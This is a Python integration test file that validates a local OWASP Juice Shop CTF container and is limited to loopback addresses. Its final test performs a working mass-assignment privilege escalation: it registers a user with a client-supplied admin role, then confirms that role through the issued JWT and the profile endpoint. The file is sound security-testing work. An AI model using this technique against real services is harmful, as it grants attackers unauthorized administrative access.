"""Integration test for the local Juice Shop CTF validation.

This test runs only when REDCODE_JUICE_SHOP_URL is explicitly set. It does not
start Docker or modify the engagement scope. It uses only the Python standard
library and verifies a normal registration flow plus a representative
mass-assignment weakness against the configured local container.
"""

import base64
import ipaddress
import json
import os
import secrets
import unittest
import urllib.error
import urllib.parse
import urllib.request

BASE_URL = os.environ.get("REDCODE_JUICE_SHOP_URL", "").rstrip("/")


def _is_loopback_target(url: str) -> bool:
    if not url:
        return False
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        return False
    if parsed.hostname == "localhost":
        return True
    try:
        return ipaddress.ip_address(parsed.hostname).is_loopback
    except ValueError:
        return False


def _request(
    method: str,
    path: str,
    body: dict | None = None,
    token: str | None = None,
) -> tuple[int, dict | str]:
    headers = {"Accept": "application/json"}
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token is not None:
        headers["Authorization"] = f"Bearer {token}"

    req = urllib.request.Request(
        f"{BASE_URL}{path}", data=data, headers=headers, method=method
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw = resp.read()
            status = resp.status
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        status = exc.code

    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, raw.decode("utf-8", errors="replace")


def _token_user_id(token: str) -> int:
    payload_b64 = token.split(".")[1]
    padding = "=" * (-len(payload_b64) % 4)
    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
    return int(payload["data"]["id"])


class JuiceShopTargetTests(unittest.TestCase):
    def test_loopback_targets_are_accepted(self):
        self.assertTrue(_is_loopback_target("http://127.0.0.1:3000"))
        self.assertTrue(_is_loopback_target("http://localhost:3000"))
        self.assertTrue(_is_loopback_target("http://[::1]:3000"))

    def test_non_loopback_targets_are_rejected(self):
        self.assertFalse(_is_loopback_target("https://example.com"))
        self.assertFalse(_is_loopback_target("http://192.168.1.10:3000"))
        self.assertFalse(_is_loopback_target("not-a-url"))


@unittest.skipUnless(
    _is_loopback_target(BASE_URL),
    "REDCODE_JUICE_SHOP_URL must identify a loopback service",
)
class JuiceShopIntegrationTests(unittest.TestCase):
    def test_service_is_reachable(self):
        status, body = _request("GET", "/")
        self.assertEqual(status, 200)
        self.assertIn("OWASP Juice Shop", str(body))

    def test_public_api_returns_challenges(self):
        status, body = _request("GET", "/api/Challenges")
        self.assertEqual(status, 200)
        self.assertEqual(body["status"], "success")
        self.assertIsInstance(body["data"], list)
        self.assertGreater(len(body["data"]), 0)

    def test_normal_registration_creates_customer(self):
        suffix = secrets.token_hex(8)
        status, body = _request(
            "POST",
            "/api/Users/",
            {
                "email": f"test-customer-{suffix}@example.test",
                "password": "TestPass123!",
                "passwordRepeat": "TestPass123!",
            },
        )
        self.assertEqual(status, 201)
        self.assertEqual(body["status"], "success")
        self.assertEqual(body["data"]["role"], "customer")

    def test_mass_assignment_escalates_role_to_admin(self):
        suffix = secrets.token_hex(8)
        email = f"test-admin-{suffix}@example.test"
        password = "TestPass123!"

        # Register with the privileged role supplied by the client.
        status, body = _request(
            "POST",
            "/api/Users/",
            {
                "email": email,
                "password": password,
                "passwordRepeat": password,
                "role": "admin",
            },
        )
        self.assertEqual(status, 201)
        self.assertEqual(body["data"]["role"], "admin")

        # Login and inspect the issued JWT.
        status, login_body = _request(
            "POST",
            "/rest/user/login",
            {"email": email, "password": password},
        )
        self.assertEqual(status, 200)
        token = login_body["authentication"]["token"]
        uid = _token_user_id(token)

        # Profile endpoint confirms the escalated role.
        status, profile = _request("GET", f"/api/Users/{uid}", token=token)
        self.assertEqual(status, 200)
        self.assertEqual(profile["data"]["role"], "admin")


if __name__ == "__main__":
    unittest.main()
